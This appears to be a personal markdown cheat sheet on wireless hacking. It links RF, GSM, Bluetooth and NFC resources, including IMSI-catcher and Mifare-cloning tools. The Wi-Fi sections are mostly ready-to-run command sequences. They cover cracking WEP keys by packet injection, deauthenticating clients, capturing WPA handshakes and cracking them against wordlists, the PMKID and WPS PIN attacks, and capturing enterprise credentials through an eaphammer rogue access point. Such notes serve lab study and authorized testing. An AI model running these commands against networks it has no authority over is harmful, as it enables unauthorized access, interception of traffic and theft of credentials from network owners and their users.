
## RF (L1)

- https://wigle.net/    #map wifi
- https://gsmmap.org/   #map gsm
- https://www.cartoradio.fr/index.html#/    # map rf
- https://www.qsl.net/on4qz/qsstv/manual/index.html
- https://recolog.blogspot.com/2017/08/demodulating-am-signals-using-gnuradio.html

`hw:0,0`: name device

```bash
sudo pacman -S qwt
aplay -l
cat /proc/asound/cards
```

### Phone Phreaking

- https://en.wikipedia.org/wiki/Phreaking
- https://en.wikipedia.org/wiki/Signalling_System_No._7

### 3G/4G protocols

- http://www.3gpp.org
- https://bellard.org/lte/
- https://github.com/mitshell/libmich
- https://cryptome.org/0001/gsm-a5-files.htm # Attacks on GSM
- https://github.com/Oros42/IMSI-catcher
- https://cellularprivacy.github.io/Android-IMSI-Catcher-Detector/

### Bluetooth (low energy)

- https://github.com/virtualabs/btlejack
- https://en.wikipedia.org/wiki/Bluetooth

### NFC

- https://www.geeksforgeeks.org/electronics-engineering/difference-between-near-field-communication-nfc-and-radio-frequency-identification-rfid/
- https://www.rfwireless-world.com/articles/nfc-tutorial-understanding-near-field-communication
- https://github.com/ikarus23/MifareClassicTool # NFC / RFID reader for Android
- [Clone NFC Mifare classic -lesviallon.fr](https://web.archive.org/web/20210622211252/https://lesviallon.fr/p/cloner-une-carte-nfc-mifare-classic-1k-hardened-265349)
- https://github.com/vk496/mfoc/tree/hardnested
- https://github.com/pokusew/nfc-pcsc


## Wifi (L2)

- https://github.com/derv82/wifite2/
- https://github.com/Tylous/SniffAir
- https://github.com/V0lk3n/WirelessPentesting-CheatSheet
- https://cheatsheet.haax.fr/wireless/wifi_cracking/
- https://www2.aircrack-ng.org/hiexpo/aircrack-ng_book_v1.pdf
- https://www.aircrack-ng.org/doku.php?id=shared_key
- https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients
- https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_via_a_wireless_client
- https://null-byte.wonderhowto.com/how-to/buy-best-wireless-network-adapter-for-wi-fi-hacking-2019-0178550/
- https://null-byte.wonderhowto.com/how-to/select-field-tested-kali-linux-compatible-wireless-adapter-0180076/

### Create AP

- https://github.com/lakinduakash/linux-wifi-hotspot
- https://networkmanager.dev/docs/api/latest/nmcli.html
- https://networkmanager.dev/docs/api/latest/nmcli-examples.html

```bash
nmcli dev wifi hotspot ssid <NAME_WIFI> password <PASSWORD>
```

### Internals

- Implementation (Linux) with `wpa_supplicant -h` or `NetworkManager -h`
- **RSN**: Robust security Networks (**802.11i**), (since TKIP/CCMP for PSK)
- **802.1X**: Port-based Network Access Control: supplicant (station/client), authenticator/controller (Access Point if Wifi) & authentication server (Radius if MGT)
- **802.11 (WIFI)**: Different norms for **channels** : 802.11a/b/g/n/ac/ad/ax
- **BSSID**: Access Point MAC, ESSID: Access Point Name, STATION MAC: MAC of 1 AP's Client, MAC: Personal MAC (`macchanger -s wlan1mon`)
- 2 modes for WPA/WPA2: **PSK** (Personal AP) and **Enterprise/MGT** (Enterprise AP with **Radius** server)
- 2 modes for WPA3: **SAE** and **Enterprise**
- Enterprise mode: Client <-- EAP (TLS,TTLS,PEAP,Kerberos,SIM)--> AP <-- PSK or SAE --> Radius server


```bash
# wep / wpa2
sudo wifite -mac --keep-ivs --ignore-locks -ic --pmkid-timeout 600 --v # --kill -inf -p 3600 --bully
```

### Man In The Middle

- https://security.stackexchange.com/questions/225985/is-there-any-point-of-arp-spoofing-on-a-wifi-network

```bash
sudo ip l set wlanx down
sudo iw wlanx set monitor none
sudo ip l set wlanx up
sudo iw wlanx info
sudo wireshark&
```

### WEP, WPA-PSK (4 way handshake with TKIP => RC4)

- https://dl.aircrack-ng.org/breakingwepandwpa.pdf
- https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
- https://aur.archlinux.org/packages/wpa_supplicant-wep
- WEP vulns: **RC4** Key Schedule, **IV Reuse** (Birthday Paradox ~ 5000 packets), bad integrity control (CRC32), no anti-replay mechanism

```txt
#wep challenge in wireshark
wlan.fc.type_subtype == 0x0020
```

#### Authentification

```txt
encrypted_packet = plaintext ^ RC4(iv|key)

iv = 24 bits
key = iv|psk
psk = 5 chars = 40 bits <-> key = iv|psk = 64 bits
psk = 13 chars = 104 bits <-> key = iv|psk = 128 bits
```

![](./images/simple-wep-crack.gif)

#### Capture & ARP Request Replay

Capture an encrypted packet which is the size of an ARP request, replays it to the AP, which generates new packets with **extra IVs**

```bash
# Using appropriate channel found using airodump-ng for the 1st time
airmon-ng stop wlan1mon
airmon-ng start wlan1 <CHANNEL>
airodump-ng --bssid <BSSID> -w wep wlan1mon

aireplay-ng -3 -b <BSSID> -h <STATION MAC> -x 600 wlan1mon
```

```bash
# WEP
aireplay-ng  --help
#  Attack modes (numbers can still be used):
#
#      --deauth      count : deauthenticate 1 or all stations (-0)
#      --fakeauth    delay : fake authentication with AP (-1)
#      --interactive       : interactive frame selection (-2)
#      --arpreplay         : standard ARP-request replay (-3)
#      --chopchop          : decrypt/chopchop WEP packet (-4)
#      --fragment          : generates valid keystream   (-5)
#      --caffe-latte       : query a client for new IVs  (-6)
#      --cfrag             : fragments against a client  (-7)
#      --migmode           : attacks WPA migration mode  (-8)
#      --test              : tests injection and quality (-9)

# WPA-PSK
tkiptun-ng --help
```

#### Capture & Deauth

```bash
airmon-ng start wlan1 #set monitor & rename wlan0 (wlan0mon)
airodump-ng wlan1mon #scan network
airodump-ng --bssid <BSSID> -w wep wlan1mon # capture from bssid (last command) , -w = prefix name

aireplay -0 1 -a <BSSID> -c <STATION MAC> wlan1mon
```

#### Capture & IP Redirection

**KoreK ChopChop**:
Chop one byte of an encrypted packet, still producing a valid CRC32

```bash
# airodump-ng --bssid <BSSID> -w wep wlan1mon

aireplay-ng -4 -b <BSSID> -h <STATION MAC> wlan1mon
# Outputting 2 files
# replay_dec_.xor replay_dec_.cap
```

**Fragmentation attack**:
Redirecting dest IP to a controlled IP, tricking the AP to decrypt the fragmented packet

```bash
# airodump-ng --bssid <BSSID> -w wep wlan1mon

aireplay-ng -5 -b <BSSID> -h <STATION MAC> <interface>
packetforge-ng -0 -a <BSSID> -h <STATION MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
aireplay-ng -2 -r <packet filename> wlan1mon
```

#### Client-Less Fake Authentication

```bash
# airodump-ng --bssid <BSSID> -w wep wlan1mon

aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <MAC> wlan1mon

# OR
# -1 6000 : Reauthenticate every 6000s
# -o 1 : Send only one set of packets at a time
# -q 10 : Send keep alive packets every 10 seconds
aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <BSSID> -h <MAC> wlan1mon
```

Then use the Fragmentation (or ChopChop) attack

```bash
aireplay-ng -5 -b <BSSID> -h <MAC> wlan1mon
#  Use this packet ? y
#  Outputting xor and cap files

# If not successful use KoreK ChopChop attack
aireplay-ng -4 -h <MAC> -b <BSSID> wlan1mon
#  Use this packet ? y
#  Outputting xor and cap files
```

Reuse this to forge a new packet

```bash
packetforge-ng -0 -a <BSSID> -h <MAC> -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp-request.cap
```
 
Relaunch airodump and inject the crafted packet

```bash
airodump-ng -c X --bssid <BSSID> -w new_capture wlan1mon
aireplay-ng -2 -r arp-request wlan1mon
#Use this packet ? y
```

Crack the captures

```bash
aircrack-ng -b <BSSID> capture*.cap 
```

#### Tests & Bruteforce

```bash
# w = hex key, testing if len(key) = 13
airdecap-ng -w $(python3 -c "import sys;sys.stdout.buffer.write(b'A'*13)"|xxd -ps) -b  <BSSID> wep-01.cap

# If len fails:
#Invalid WEP key length. [5,13,16,29,61]
#"airdecap-ng --help" for help.
```

```bash
# -a 1 = wep (default)
# -k = korek attack (inspired by FMS), -z = ptw attack (default)

# -n = length key. If len(hex_key)=13 then n = 128
aircrack-ng -w rockyou.txt -b <BSSID> -n 128 wep-01.cap

# set interface back to managed mode
# airodump-ng stop wlan1mon
```

### WPA/WPA2 (4way handshake with CCMP = AES 128 CBC-MAC)

- https://www.aircrack-ng.org/doku.php?id=cracking_wpa
- https://www.wifi-professionals.com/2019/01/4-way-handshake

#### Capture 4-way handshake, Deauth & Bruteforce

**Aircrack**

```bash
#airmon-ng stop wlan1mon
#airmon-ng start wlan1 <CHANNEL>

airodump-ng --bssid <BSSID> -w wpa wlan1mon #find bssid (last command) , -w = prefix name
aireplay -0 1 -a <BSSID> -c <STATION MAC> wlan1mon

# -a 2 = wpa-psk
aircrack-ng -a 2 -w rockyou.txt -b <BSSID> wpa-01.cap
```

**Bettercap**

```bash
sudo docker run -it --privileged --rm --net=host bettercap/bettercap -iface wlanx
#wifi.recon help

wpapcap2john bettercap-wifi-handshakes.pcap
```

#### Tests and Bruteforce

```bash
cowpatty -r hs/handshake_RepeatSalon.cap -f ~/SecLists/Passwords/darkc0de.txt -s RepeatSalon -vv
cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.

AA is : ...
SPA is : ...
snonce is: ...
anonce is: ...
keymic is: ...
eapolframe is: ...
```

**Wifite**

```bash
sudo wifite --crack --dict ~/SecLists/Passwords/darkc0de.txt # aircrack, john, hashcat (all bf including PMKID), cowpatty (depreciated)
sudo wifite --crack --dict ~/SecLists/Fuzzing/6-digits-000000-999999.txt 
```

#### Client-Less PMKID attack

- https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/
- Included in **wifite2**

```bash
airmon-ng start wlan1
hcxdumptool -i wlan1mon -o outfile.pcapng --enable_status=1
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcapng
hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
```

#### KRACK

- https://beta.hackndo.com/krack/
- https://www.krackattacks.com/
- https://github.com/vanhoefm/krackattacks-scripts

#### WPS Pin attacks

- Pixie-Dust & Pin bf attack: `reaver`, `bully`
- NULL Pin: `reaver`
- Included in **wifite2**

```bash
sudo wash -i wlan1mon
#BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID

sudo reaver -i wlan0mon -b <BSSID> -vv
```

### WPA2-EAP | WPA-MGT (Entreprise)

- https://www.cisco.com/c/en/us/support/docs/wireless-mobility/wireless-lan-wlan/214275-configure-wireshark-and-freeradius-in-or.html
- https://github.com/koutto/pi-pwnbox-rogueap/wiki/07.-WPA-WPA2-Enterprise-(MGT)

```bash
sudo python3 ./eaphammer –cert-wizard
sudo python3 ./eaphammer -i wlan6 --creds -e "xxx" -b xx:xx:xx:xx:xx:xx #BSSID /MAC
```

### WPA3 (SAE+EAP/MGT)

- https://wpa3.mathyvanhoef.com/
